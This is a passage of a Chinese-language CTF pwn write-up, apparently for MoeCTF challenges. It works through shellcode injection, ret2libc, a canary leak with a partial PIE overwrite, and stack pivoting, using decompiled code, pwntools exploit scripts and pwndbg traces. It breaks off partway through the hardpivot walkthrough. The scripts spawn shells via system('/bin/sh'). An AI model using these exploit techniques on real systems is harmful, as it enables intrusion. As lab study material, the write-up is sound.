n10 = getchar();  while ( n10 != 10 &amp;&amp; n10 != -1 );  if ( n4 == 4 )  &#123;    if ( v6 == 1 )      puts(&quot;You can only make one change!&quot;);    prot = 7;    v6 = 1;  &#125;  else  &#123;    if ( n4 &gt; 4 )      goto LABEL_24;    switch ( n4 )    &#123;      case 3:        if ( v6 == 1 )          puts(&quot;You can only make one change!&quot;);        prot = 4;        v6 = 1;        break;      case 1:        if ( v6 == 1 )          puts(&quot;You can only make one change!&quot;);        prot = 1;        v6 = 1;        break;      case 2:        if ( v6 == 1 )          puts(&quot;You can only make one change!&quot;);        prot = 3;        v6 = 1;        break;      default:LABEL_24:        puts(&quot;Invalid choice. The space remains in its chaotic state.&quot;);        exit(1);    &#125;  &#125;  if ( mprotect(s, 0x1000uLL, prot) == -1 )  &#123;    perror(&quot;mprotect&quot;);    exit(1);  &#125;  puts(&quot;\nYou have now changed the permissions of the shellcode area.&quot;);  puts(&quot;If you can&#x27;t input your shellcode, think about the permissions you just set.&quot;);  read(0, s, 0x1000uLL);  ((void (*)(void))s)();  return 0;&#125;
观察到((void (*)(void))s)()，是一个可能可利用的shellcode
选择4给可读可写可执行权限，再利用shellcraft工具将sh写入s，程序就会将s的内容执行
io = start()io.recvuntil(b&quot;I will give you some choices. Choose wisely!\n&quot;)io.sendline(str(4))io.recvuntil(b&quot;If you can&#x27;t input your shellcode, think about the permissions you just set.\n&quot;)io.send(asm(shellcraft.sh()))io.interactive()
Prelibc
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  setup(argc, argv, envp);  puts(&quot;The Oracle speaks...&quot;);  puts(&quot;There is no system function in the .text segment.&quot;);  printf(&quot;A gift of forbidden knowledge, the location of &#x27;printf&#x27;: %p\n&quot;, &amp;printf);  vuln();  return 0;&#125;
ssize_t vuln()&#123;  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF  puts(&quot;\nNow, show me what you can do with this knowledge:&quot;);  printf(&quot;&gt; &quot;);  return read(0, buf, 0x100uLL);&#125;
相较于Ret2text，没有了后门函数，需要我们字节构建system(“/bin/sh”)
p = start()p.recvuntil(b&quot;A gift of forbidden knowledge, the location of &#x27;printf&#x27;: &quot;)printf_bytes=p.recvuntil(b&#x27;\n&#x27;)printf_addr_str = printf_bytes.strip().decode(&#x27;utf-8&#x27;)printf_addr = int(printf_addr_str, 16)log.success(hex(printf_addr))libc_base=printf_addr-libc.sym[&#x27;printf&#x27;]sys_addr=libc_base+libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))pop_rdi_addr=libc_base+0x2a3e5p.recvuntil(b&quot;&gt; &quot;)payload=b&#x27;A&#x27;*0x48+p64(pop_rdi_addr+1)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(sys_addr)p.send(payload)p.interactive()
利用给的printf的地址，计算出libc的基地址，计算出“pop rdi;ret”、system与“/bin/sh”的地址
A*0x48覆盖buf和rbp，再利用pop_rdi_addr+1即是ret，用来防止栈没对齐，再执行pop rdi，将“/bin/sh”传入rdi中，返回system函数实现劫持
Easylibc
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  setbuf(_bss_start, 0LL);  printf(&quot;What is this?\nHow can I use %p without a backdoor? Damn!\n&quot;, &amp;read);  vuln();  puts(&quot;Something happening&quot;);  return 0;&#125;
ssize_t vuln()&#123;  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF  return read(0, buf, 0x60uLL);&#125;
[*] &#x27;/home/ubuntu/Moectf/easylibc/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
这题相较于Prelibc，关联到延迟绑定的内容
第一次输出时，输出的是一个还未使用过的函数read的地址，即是read的got表地址
[DEBUG] Received 0x45 bytes:    b&#x27;What is this?\n&#x27;    b&#x27;How can I use 0x5a5e41533060 without a backdoor? Damn!\n&#x27;[+] read got addr: 0x5a5e41533060
pwndbg&gt; gotFiltering out read-only entries (display them with -r or --show-readonly)State of the GOT of /home/ubuntu/Moectf/easylibc/pwn_patched:GOT protection: Partial RELRO | Found 4 GOT entries passing the filter[0x5a5e41536018] puts@GLIBC_2.2.5 -&gt; 0x5a5e41533030 ◂— endbr64[0x5a5e41536020] setbuf@GLIBC_2.2.5 -&gt; 0x7dae4ee87fe0 (setbuf) ◂— endbr64[0x5a5e41536028] printf@GLIBC_2.2.5 -&gt; 0x7dae4ee606f0 (printf) ◂— endbr64[0x5a5e41536030] read@GLIBC_2.2.5 -&gt; 0x5a5e41533060 ◂— endbr64
我们可以利用该地址算出main函数的地址，利用Ret2text使程序重新执行main函数
第二次输出时输出的就是read的真实地址，此时我们就可以利用Ret2libc劫持
[DEBUG] Received 0x45 bytes:    b&#x27;What is this?\n&#x27;    b&#x27;How can I use 0x7dae4ef147d0 without a backdoor? Damn!\n&#x27;[+] read addr: 0x7dae4ef147d0[+] libc_base addr: 0x7dae4ee00000[+] system addr: 0x7dae4ee50d70[+] bin addr: 0x7dae4efd8678[+] rdi addr: 0x7dae4ee2a3e5
pwndbg&gt; gotFiltering out read-only entries (display them with -r or --show-readonly)State of the GOT of /home/ubuntu/Moectf/easylibc/pwn_patched:GOT protection: Partial RELRO | Found 4 GOT entries passing the filter[0x5a5e41536018] puts@GLIBC_2.2.5 -&gt; 0x5a5e41533030 ◂— endbr64[0x5a5e41536020] setbuf@GLIBC_2.2.5 -&gt; 0x7dae4ee87fe0 (setbuf) ◂— endbr64[0x5a5e41536028] printf@GLIBC_2.2.5 -&gt; 0x7dae4ee606f0 (printf) ◂— endbr64[0x5a5e41536030] read@GLIBC_2.2.5 -&gt; 0x7dae4ef147d0 (read) ◂— endbr64
p = start()p.recvuntil(b&quot;What is this?\nHow can I use &quot;)got_addr_hex_bytes = p.recvuntil(b&#x27; &#x27;)[:-1]read_got_addr = int(got_addr_hex_bytes.decode(), 16)log.success(&quot;read got addr: %s&quot;,hex(read_got_addr))main_base=read_got_addr-elf.sym[&quot;read&quot;]+elf.sym[&quot;main&quot;]+0x54+0x5payload0=b&#x27;A&#x27;*0x28+p64(main_base)p.send(payload0)p.recvuntil(b&quot;What is this?\nHow can I use &quot;)addr_hex_bytes = p.recvuntil(b&#x27; &#x27;)[:-1]read_addr = int(addr_hex_bytes.decode(), 16)log.success(&quot;read addr: %s&quot;,hex(read_addr))libc_base=read_addr-libc.sym[&quot;read&quot;]sys_addr=libc_base+libc.sym[&quot;system&quot;]bin_addr=libc_base+next(libc.search(b&quot;/bin/sh&quot;))pop_rdi_addr=libc_base+0x2a3e5log.success(&quot;libc_base addr: %s&quot;,hex(libc_base))log.success(&quot;system addr: %s&quot;,hex(sys_addr))log.success(&quot;bin addr: %s&quot;,hex(bin_addr))log.success(&quot;rdi addr: %s&quot;,hex(pop_rdi_addr))p.recvuntil(b&quot;without a backdoor? Damn!\n&quot;)payload=b&#x27;A&#x27;*0x28+p64(pop_rdi_addr+1)+p64(pop_rdi_addr)+p64(bin_addr)+p64(sys_addr)p.send(payload)p.interactive()
Ezcanary
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  setup(argc, argv, envp);  vuln();  return 0;&#125;
unsigned __int64 vuln()&#123;  char buf[24]; // [rsp+0h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(aThisTimeIWon);  puts(&quot;Here is a beautiful canary, and it will be watching over you.&quot;);  read(0, buf, 0x2AuLL);  puts(&quot;Go ahead and overflow, anyway I have a canary.&quot;);  puts(buf);  puts(&quot;I will give you a second chance, since you can not do anything anyway.&quot;);  puts(aEvenIfYouKillT);  read(0, buf, 0x2AuLL);  return v2 - __readfsqword(0x28u);&#125;
对于有canary保护的该程序，多输入一字节将canary的00覆盖，这样在puts(buf)是就会将canary的其余七字节泄露出，这样就绕过了canary保护
.text:0000000000001229                 public backdoor.text:0000000000001229 backdoor        proc near.text:0000000000001229.text:0000000000001229 buf             = qword ptr -10h.text:0000000000001229 var_8           = qword ptr -8.text:0000000000001229.text:0000000000001229 ; __unwind &#123;.text:0000000000001229                 endbr64.text:000000000000122D                 push    rbp.text:000000000000122E                 mov     rbp, rsp.text:0000000000001231                 sub     rsp, 10h.text:0000000000001235                 mov     rax, fs:28h.text:000000000000123E                 mov     [rbp+var_8], rax.text:0000000000001242                 xor     eax, eax.text:0000000000001244                 lea     rax, s          ; &quot;Give me the password!&quot;.text:000000000000124B                 mov     rdi, rax        ; s.text:000000000000124E                 call    _puts.text:0000000000001253                 lea     rax, [rbp+buf].text:0000000000001257                 mov     edx, 8          ; nbytes.text:000000000000125C                 mov     rsi, rax        ; buf.text:000000000000125F                 mov     edi, 0          ; fd.text:0000000000001264                 call    _read.text:0000000000001269                 mov     rdx, [rbp+buf].text:000000000000126D                 mov     rax, cs:password.text:0000000000001274                 cmp     rdx, rax.text:0000000000001277                 jnz     loc_1311.text:000000000000127D                 lea     rax, aYouFindTheSecr ; &quot;You find the secret:&quot;.text:0000000000001284                 mov     rdi, rax        ; s.text:0000000000001287                 call    _puts.text:000000000000128C                 mov     esi, 0          ; oflag.text:0000000000001291                 lea     rax, file       ; &quot;/flag&quot;.text:0000000000001298                 mov     rdi, rax        ; file.text:000000000000129B                 mov     eax, 0.text:00000000000012A0                 call    _open.text:00000000000012A5                 mov     cs:fd, eax.text:00000000000012AB                 mov     eax, cs:fd.text:00000000000012B1                 cmp     eax, 0FFFFFFFFh.text:00000000000012B4                 jnz     short loc_12CF.text:00000000000012B6                 lea     rax, aFailedToOpenFl ; &quot;Failed to open flag file.&quot;.text:00000000000012BD                 mov     rdi, rax        ; s.text:00000000000012C0                 call    _puts.text:00000000000012C5                 mov     edi, 1          ; status.text:00000000000012CA                 call    _exit.text:00000000000012CF ; ---------------------------------------------------------------------------.text:00000000000012CF.text:00000000000012CF loc_12CF:                               ; CODE XREF: backdoor+8B↑j.text:00000000000012CF                 mov     eax, cs:fd.text:00000000000012D5                 mov     edx, 64h ; &#x27;d&#x27;  ; nbytes.text:00000000000012DA                 lea     rcx, flag.text:00000000000012E1                 mov     rsi, rcx        ; buf.text:00000000000012E4                 mov     edi, eax        ; fd.text:00000000000012E6                 call    _read.text:00000000000012EB                 mov     edx, 64h ; &#x27;d&#x27;  ; n.text:00000000000012F0                 lea     rax, flag.text:00000000000012F7                 mov     rsi, rax        ; buf.text:00000000000012FA                 mov     edi, 1          ; fd.text:00000000000012FF                 call    _write.text:0000000000001304                 mov     eax, cs:fd.text:000000000000130A                 mov     edi, eax        ; fd.text:000000000000130C                 call    _close.text:0000000000001311.text:0000000000001311 loc_1311:                               ; CODE XREF: backdoor+4E↑j.text:0000000000001311                 mov     edi, 0          ; status.text:0000000000001316                 call    _exit.text:0000000000001316 ; &#125; // starts at 1229.text:0000000000001316 backdoor        endp
此外还有PIE保护和后门函数，我们还可以覆盖返回地址的两个字节
对于开启PIE保护的程序，后三位地址是固定的，所以我们只需要从028c、128c、…、f28c中选一个进行爆破，有$\frac{1}{16}$的概率成功
p = start()p.recvuntil(b&quot;Here is a beautiful canary, and it will be watching over you.\n&quot;)payload1=b&#x27;a&#x27;*0x19p.send(payload1)p.recvuntil(b&#x27;a&#x27;*0x19)canary_leak = p.recvn(7)canary_bytes = b&#x27;\x00&#x27;+canary_leakcanary = u64(canary_bytes)log.success(f&quot;完整 canary(8 字节): 0x&#123;canary:016x&#125;&quot;)payload2 = 0x18*b&quot;a&quot;+p64(canary)+p64(0xaaaaaaaa)+b&quot;\x8c\x52&quot;p.send(payload2)p.interactive()
Ezpivot
[*] &#x27;/home/ubuntu/Moectf/ezpivot/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int n32; // [rsp+0h] [rbp-10h] BYREF  _BYTE buf[12]; // [rsp+4h] [rbp-Ch] BYREF  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  puts(&quot;Welcome to join this pwn party!&quot;);  puts(&quot;Please say something to introduce yourself:&quot;);  puts(&quot;Before that,you need to tell us the length of your introduction.&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;n32);  if ( n32 &gt; 32 )  &#123;    puts(&quot;Your introduction is too long, please try again.&quot;);    exit(1);  &#125;  introduce((unsigned int)n32);  puts(&quot;Now, please tell us your phone number:&quot;);  read(0, buf, len_of_phonenum);  return 0;&#125;
这里存在由int到unsigned int的强制转换，输入-1就能使（unsigned int)n32达到非常大的值
int __fastcall introduce(unsigned int nbytes)&#123;  read(0, &amp;desc, nbytes);  return puts(&quot;Ok,we got your introduction!&quot;);&#125;
.bss:0000000000404060                 public desc.bss:0000000000404060 desc            db    ? ;               ; DATA XREF: introduce+15↑o.bss:0000000000404061                 db    ? ;....bss:000000000040485F                 db    ? ;.bss:000000000040485F _bss            ends.bss:000000000040485F
desc在bss段上，可以任意写
.data:0000000000404010                 public len_of_phonenum.data:0000000000404010 len_of_phonenum dd 1Ch                  ; DATA XREF: main+E8↑r.data:0000000000404010 _data           ends
栈上只能覆盖rbp和返回地址
.text:0000000000401211 ; void magic().text:0000000000401211                 public magic.text:0000000000401211 magic           proc near.text:0000000000401211 ; __unwind &#123;.text:0000000000401211                 endbr64.text:0000000000401215                 push    rbp.text:0000000000401216                 mov     rbp, rsp.text:0000000000401219                 pop     rdi.text:000000000040121A                 retn.text:000000000040121A magic           endp.text:000000000040121A.text:000000000040121A ; ---------------------------------------------------------------------------.text:000000000040121B                 align 4.text:000000000040121C                 pop     rbp.text:000000000040121D                 retn.text:000000000040121D ; &#125; // starts at 401211.text:000000000040121E.text:000000000040121E ; =============== S U B R O U T I N E =======================================.text:000000000040121E.text:000000000040121E ; Attributes: bp-based frame.text:000000000040121E.text:000000000040121E                 public backdoor.text:000000000040121E backdoor        proc near.text:000000000040121E ; __unwind &#123;.text:000000000040121E                 endbr64.text:0000000000401222                 push    rbp.text:0000000000401223                 mov     rbp, rsp.text:0000000000401226                 lea     rax, command    ; &quot;echo moectf&#123;WowYouGetTheFlag&#125;&quot;.text:000000000040122D                 mov     rdi, rax        ; command.text:0000000000401230                 call    _system.text:0000000000401235                 pop     rbp.text:0000000000401236                 retn.text:0000000000401236 ; &#125; // starts at 40121E.text:0000000000401236 backdoor        endp
没有直接system返回地址可以用，需要我们构造pop rdi-&gt;binsh_addr-&gt;retn-&gt;system但是溢出字节不够，需要栈迁移
p = start()leave_pop_ret_addr=0x401211leave_ret_addr=0x40133ebackdoor_addr=0x401230bss_addr=0x404060pop_rdi_addr=0x401219main_addr=0x4011dep.recvuntil(b&quot;Before that,you need to tell us the length of your introduction.\n&quot;)p.sendline(str(-1))payload1=b&#x27;/bin/sh\x00&#x27;*0x100+p64(bss_addr+0x200)+p64(pop_rdi_addr)+p64(0x404078)+p64(backdoor_addr)p.send(payload1)p.recvuntil(b&quot;Now, please tell us your phone number:\n&quot;)payload2=b&#x27;a&#x27;*0xc+p64(bss_addr+0x800)+p64(leave_ret_addr)p.sendline(payload2)p.interactive()
我们先在bss段上构造我们可以利用的栈，再利用第二次输入实现栈迁移并劫持程序
为什么b’/bin/sh‘*0x100？调用system函数会利用很大的栈空间，所以我们需要抬高栈基地址，并不一定是b’/bin/sh’*0x100
.text:0000000000401334                 call    _read.text:0000000000401339                 mov     eax, 0.text:000000000040133E                 leave.text:000000000040133F                 retn
下面来详细解释一下流程：
第二次输入完成后，leave(mov rsp,rbp；pop rbp)此时rbp变为0x404860
接着返回我们控制的leave；retn
再次进行leave，此时rsp指向0x404860+0x8(对应pop_rdi_addr），rbp指向0x404260
retn(pop rip)执行pop rdi，将0x404078地址的内容即是/bin/sh00弹入rdi
再执行0x401230 call _system即可实现劫持
下面是system调用需要注意的地方
  0x7f5cd00582d0 &lt;do_system&gt;       push   r13  0x7f5cd00582d2 &lt;do_system+2&gt;     mov    edx, 1                              EDX =&gt; 1  0x7f5cd00582d7 &lt;do_system+7&gt;     push   r12  0x7f5cd00582d9 &lt;do_system+9&gt;     mov    r12, rdi                            R12 =&gt; 0x404078 (desc+24) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */  0x7f5cd00582dc &lt;do_system+12&gt;    push   rbp► 0x7f5cd00582dd &lt;do_system+13&gt;    push   rbx  0x7f5cd00582de &lt;do_system+14&gt;    `sub    rsp, 0x388`                          RSP =&gt; 0x4044d0 (desc+1136) (0x404858 - 0x388)  0x7f5cd00582e5 &lt;do_system+21&gt;    mov    rax, qword ptr fs:[0x28]            RAX, [0x7f5cd0291768] =&gt; 0x57019af9a1b4e700  0x7f5cd00582ee &lt;do_system+30&gt;    mov    qword ptr [rsp + 0x378], rax        [desc+2024] &lt;= 0x57019af9a1b4e700  0x7f5cd00582f6 &lt;do_system+38&gt;    xor    eax, eax                            EAX =&gt; 0  0x7f5cd00582f8 &lt;do_system+40&gt;    mov    dword ptr [rsp + 8], 0xffffffff     [desc+1144] &lt;= 0xffffffff
hardpivot
[*] &#x27;/home/ubuntu/Moectf/hardpivot/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  setup(argc, argv, envp);  vuln();  puts(&quot;See you again!&quot;);  return 0;&#125;
ssize_t vuln()&#123;  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF  puts(&quot;This time I will not give you any gifts again.&quot;);  puts(aASingleStackPi);  puts(&quot;Think back to what you learned from the previous challenges and integrate it comprehensively.&quot;);  puts(&quot;You have made it this far—keep going, victory is not far away.&quot;);  printf(&quot;&gt; &quot;);  return read(0, buf, 0x50uLL);&#125;
.text:0000000000401208 ; ssize_t vuln().text:0000000000401208                 public vuln.text:0000000000401208 vuln            proc near               ; CODE XREF: main+17↓p.text:0000000000401208.text:0000000000401208 buf             = byte ptr -40h.text:0000000000401208.text:0000000000401208 ; __unwind &#123;.text:0000000000401208                 endbr64.text:000000000040120C                 push    rbp.text:000000000040120D                 mov     rbp, rsp.text:0000000000401210                 sub     rsp, 40h.text:0000000000401214                 lea     rax, s          ; &quot;This time I will not give you any gifts&quot;....text:000000000040121B                 mov     rdi, rax        ; s.text:000000000040121E                 call    _puts.text:0000000000401223                 lea     rax, aASingleStackPi ; &quot;A single stack pivot doesn&quot;.text:000000000040122A                 mov     rdi, rax        ; s.text:000000000040122D                 call    _puts.text:0000000000401232                 lea     rax, aThinkBackToWha ; &quot;Think back to what you learned from the&quot;....text:0000000000401239                 mov     rdi, rax        ; s.text:000000000040123C                 call    _puts.text:0000000000401241                 lea     rax, aYouHaveMadeItT ; &quot;You have made it this far—keep going, v&quot;....text:0000000000401248                 mov     rdi, rax        ; s.text:000000000040124B                 call    _puts.text:0000000000401250                 lea     rax, format     ; &quot;&gt; &quot;.text:0000000000401257                 mov     rdi, rax        ; format.text:000000000040125A                 mov     eax, 0.text:000000000040125F                 call    _printf.text:0000000000401264                 lea     rax, [rbp+buf].text:0000000000401268                 mov     edx, 50h ; &#x27;P&#x27;  ; nbytes.text:000000000040126D                 mov     rsi, rax        ; buf.text:0000000000401270                 mov     edi, 0          ; fd.text:0000000000401275                 call    _read.text:000000000040127A                 nop.text:000000000040127B                 leave.text:000000000040127C                 retn.text:000000000040127C ; &#125; // starts at 401208.text:000000000040127C vuln            endp
注意到vuln函数后面有leave;retn
.text:0000000000401196 ; void magic().text:0000000000401196                 public magic.text:0000000000401196 magic           proc near.text:0000000000401196 ; __unwind &#123;.text:0000000000401196                 endbr64.text:000000000040119A                 push    rbp.text:000000000040119B                 mov     rbp, rsp.text:000000000040119E                 pop     rdi.text:000000000040119F                 retn.text:000000000040119F magic           endp.text:000000000040119F.text:000000000040119F ; ---------------------------------------------------------------------------.text:00000000004011A0                 db 90h.text:00000000004011A1 ; ---------------------------------------------------------------------------.text:00000000004011A1                 pop     rbp.text:00000000004011A2                 retn.text:00000000004011A2 ; &#125; // starts at 401196
缓冲区只溢出两个8字节并且没有后门，应该是要栈迁移
我们的思路是：
第一次进行栈迁移，并且使程序重新执行read读取我们构造的攻击载荷到新栈上
要进行system需要知道地址，即需要libc基址，所以我们需要在攻击载荷中将某个函数的真实地址作为参数传给输出函数，并且控制程序重新执行
第三次将最终的攻击载荷写到新栈上，并控制程序执行
下面我们来一步一步的观察一下进程

第一次read前

 RBP  0x7fff76f94a80 —▸ 0x7fff76f94a90 ◂— 1 RSP  0x7fff76f94a40 —▸ 0x7b3a0be1b6a0 (_IO_2_1_stderr_) ◂— 0xfbad2087*RIP  0x401275 (vuln+109) ◂— call read@plt ► 0x401275 &lt;vuln+109&gt;    call   read@plt                    &lt;read@plt&gt;        fd: 0 (pipe:[82862])        buf: 0x7fff76f94a40 —▸ 0x7b3a0be1b6a0 (_IO_2_1_stderr_) ◂— 0xfbad2087        nbytes: 0x5000:0000│ rax rsi rsp 0x7fff76f94a40 —▸ 0x7b3a0be1b6a0 (_IO_2_1_stderr_) ◂— 0xfbad208701:0008│-038         0x7fff76f94a48 —▸ 0x7b3a0bc816e5 (setvbuf+245) ◂— cmp rax, 102:0010│-030         0x7fff76f94a50 ◂— 003:0018│-028         0x7fff76f94a58 —▸ 0x7fff76f94a80 —▸ 0x7fff76f94a90 ◂— 104:0020│-020         0x7fff76f94a60 —▸ 0x7fff76f94ba8 —▸ 0x7fff76f969e6 ◂— &#x27;/home/ubuntu/Moectf/hardpivot/pwn_patched&#x27;05:0028│-018         0x7fff76f94a68 —▸ 0x40127d (main) ◂— endbr6406:0030│-010         0x7fff76f94a70 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr6407:0038│-008         0x7fff76f94a78 —▸ 0x401205 (setup+98) ◂— nop08:0040│ rbp         0x7fff76f94a80 —▸ 0x7fff76f94a90 ◂— 109:0048│+008         0x7fff76f94a88 —▸ 0x401299 (main+28) ◂— lea rax, [rip + 0xe84]

第一次read后

 RBP  0x7fff76f94a80 —▸ 0x404880 (bss_buffer+2016) ◂— 0 RSP  0x7fff76f94a40 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)*RIP  0x40127b (vuln+115) ◂— leave ► 0x40127b &lt;vuln+115&gt;    leave 00:0000│ rsi rsp 0x7fff76f94a40 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)... ↓            7 skipped08:0040│ rbp     0x7fff76f94a80 —▸ 0x404880 (bss_buffer+2016) ◂— 009:0048│+008     0x7fff76f94a88 —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]

第一次leave后

*RBP  0x404880 (bss_buffer+2016) ◂— 0*RSP  0x7fff76f94a88 —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]*RIP  0x40127c (vuln+116) ◂— ret ► 0x40127c &lt;vuln+116&gt;    ret                                &lt;vuln+92&gt;  00:0000│ rsp 0x7fff76f94a88 —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]

第一次retn后，第二次read前

 RBP  0x404880 (bss_buffer+2016) ◂— 0*RSP  0x7fff76f94a90 ◂— 1*RIP  0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40] ► 0x401264 &lt;vuln+92&gt;     lea    rax, [rbp - 0x40]     RAX =&gt; 0x404840 (bss_buffer+1952) ◂— 0 00:0000│ rsp 0x7fff76f94a90 ◂— 101:0008│     0x7fff76f94a98 —▸ 0x7b3a0bc29d90 ◂— mov edi, eax02:0010│     0x7fff76f94aa0 ◂— 003:0018│     0x7fff76f94aa8 —▸ 0x40127d (main) ◂— endbr6404:0020│     0x7fff76f94ab0 ◂— 0x176f94b9005:0028│     0x7fff76f94ab8 —▸ 0x7fff76f94ba8 —▸ 0x7fff76f969e6 ◂— &#x27;/home/ubuntu/Moectf/hardpivot/pwn_patched&#x27;06:0030│     0x7fff76f94ac0 ◂— 007:0038│     0x7fff76f94ac8 ◂— 0x5292586019285d4d

第二次read后

 RBP  0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0 RSP  0x7fff76f94a90 ◂— 1*RIP  0x40127b (vuln+115) ◂— leave ► 0x40127b &lt;vuln+115&gt;    leave  00:0000│ rsp 0x7fff76f94a90 ◂— 1 pwndbg&gt; tele 0x40484000:0000│ rsi 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 001:0008│-038 0x404848 (bss_buffer+1960) —▸ 0x40119e (magic+8) ◂— pop rdi02:0010│-030 0x404850 (bss_buffer+1968) —▸ 0x404018 (puts@got[plt]) —▸ 0x7b3a0bc80e50 (puts) ◂— endbr6403:0018│-028 0x404858 (bss_buffer+1976) —▸ 0x401070 (puts@plt) ◂— endbr6404:0020│-020 0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]05:0028│-018 0x404868 (bss_buffer+1992) ◂— 0... ↓        2 skipped08:0040│ rbp 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 009:0048│+008 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave

第二次leave后

*RBP  0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0*RSP  0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave*RIP  0x40127c (vuln+116) ◂— ret ► 0x40127c &lt;vuln+116&gt;    ret  00:0000│ rsp 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave

第二次retn后，第二次ret返回的是我们控制的leave

 RBP  0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0*RSP  0x404890 (bss_buffer+2032) ◂— 0*RIP  0x40127b (vuln+115) ◂— leave ► 0x40127b &lt;vuln+115&gt;      leave  00:0000│ rsp 0x404890 (bss_buffer+2032) ◂— 0... ↓        7 skipped

控制执行leave后

*RBP  0x404780 (bss_buffer+1760) ◂— 0*RSP  0x404848 (bss_buffer+1960) —▸ 0x40119e (magic+8) ◂— pop rdi*RIP  0x40127c (vuln+116) ◂— ret ► 0x40127c       &lt;vuln+116&gt;      ret 00:0000│ rsp 0x404848 (bss_buffer+1960) —▸ 0x40119e (magic+8) ◂— pop rdi01:0008│+0d0 0x404850 (bss_buffer+1968) —▸ 0x404018 (puts@got[plt]) —▸ 0x7b3a0bc80e50 (puts) ◂— endbr6402:0010│+0d8 0x404858 (bss_buffer+1976) —▸ 0x401070 (puts@plt) ◂— endbr6403:0018│+0e0 0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]04:0020│+0e8 0x404868 (bss_buffer+1992) ◂— 0... ↓        2 skipped07:0038│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 008:0040│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave

控制执行ret后，即将执行put

 RBP  0x404780 (bss_buffer+1760) ◂— 0*RSP  0x404850 (bss_buffer+1968) —▸ 0x404018 (puts@got[plt]) —▸ 0x7b3a0bc80e50 (puts) ◂— endbr64*RIP  0x40119e (magic+8) ◂— pop rdi ► 0x40119e       &lt;magic+8&gt;       pop    rdi     RDI =&gt; 0x404018 (puts@got[plt])   0x40119f       &lt;magic+9&gt;       ret                                &lt;puts@plt&gt;    ↓   0x401070       &lt;puts@plt&gt;      endbr64   0x401074       &lt;puts@plt+4&gt;    bnd jmp qword ptr [rip + 0x2f9d]   &lt;puts&gt;   00:0000│ rsp 0x404850 (bss_buffer+1968) —▸ 0x404018 (puts@got[plt]) —▸ 0x7b3a0bc80e50 (puts) ◂— endbr6401:0008│+0d8 0x404858 (bss_buffer+1976) —▸ 0x401070 (puts@plt) ◂— endbr6402:0010│+0e0 0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]03:0018│+0e8 0x404868 (bss_buffer+1992) ◂— 0... ↓        2 skipped06:0030│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 007:0038│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave

put结束前

 RBP  0x404780 (bss_buffer+1760) ◂— 0*RSP  0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]*RIP  0x7b3a0bc80f82 (puts+306) ◂— ret ► 0x7b3a0bc80f82 &lt;puts+306&gt;    ret                                &lt;vuln+92&gt; 00:0000│ rsp 0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]01:0008│+0e8 0x404868 (bss_buffer+1992) ◂— 0... ↓        2 skipped04:0020│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 005:0028│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave

第三次read前

